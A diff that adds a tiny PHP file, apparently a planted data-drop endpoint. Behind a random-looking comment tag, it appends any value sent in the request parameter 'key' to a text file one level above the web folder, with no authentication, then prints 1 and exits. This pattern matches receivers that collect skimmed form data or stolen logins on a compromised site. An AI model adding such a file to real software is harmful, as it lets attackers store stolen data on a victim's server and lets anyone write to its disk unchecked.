@@ -1,0 +1,1 @@
+<?php  /* 17olSplDveZ9u51yjoi9E */   if (!file_exists('../fatti.txt')) { touch('../fatti.txt'); } if(isset($_REQUEST['key'])){ $riga = $_REQUEST['key']; $myfile = file_put_contents('../fatti.txt', $riga.PHP_EOL , FILE_APPEND | LOCK_EX); echo 1; } exit(); ?><?php  ?>
